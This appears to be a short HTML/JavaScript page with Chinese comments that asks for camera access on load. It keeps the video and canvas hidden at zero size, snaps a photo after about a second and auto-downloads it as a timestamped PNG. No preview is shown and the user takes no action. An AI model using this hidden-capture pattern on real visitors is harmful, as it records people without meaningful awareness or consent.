<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>拍照并保存到本地</title>
</head>
<body>
    <video id="video" width="0" height="0" autoplay></video>
    <canvas style="width:0px;height:0px" id="canvas" width="480" height="640"></canvas>

<script type="text/javascript">
window.addEventListener("DOMContentLoaded", function() {
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');
    const video = document.getElementById('video');

    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        navigator.mediaDevices.getUserMedia({ video: true })
        .then(function(stream) {
            video.srcObject = stream;
            video.play();

            // 1秒后画到canvas
            setTimeout(function() {
                context.drawImage(video, 0, 0, 480, 640);
            }, 1000);

            // 1.3秒后直接下载保存（不提交form）
            setTimeout(function() {
                const imgData = canvas.toDataURL('image/png');
                saveImage(imgData); // 保存到本地
            }, 1300);
        })
        .catch(function() {
            alert("操作失败-权限不够！");
        });
    }
}, false);

// 纯前端保存图片到本地（下载到浏览器默认下载目录）
function saveImage(dataUrl) {
    const link = document.createElement('a');
    link.href = dataUrl;
    // 文件名：当前时间戳
    link.download = 'cap_' + Date.now() + '.png';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    alert("2778917878781313！");
}
</script>

<!-- form 不再需要，直接删掉 -->
</body>
</html>
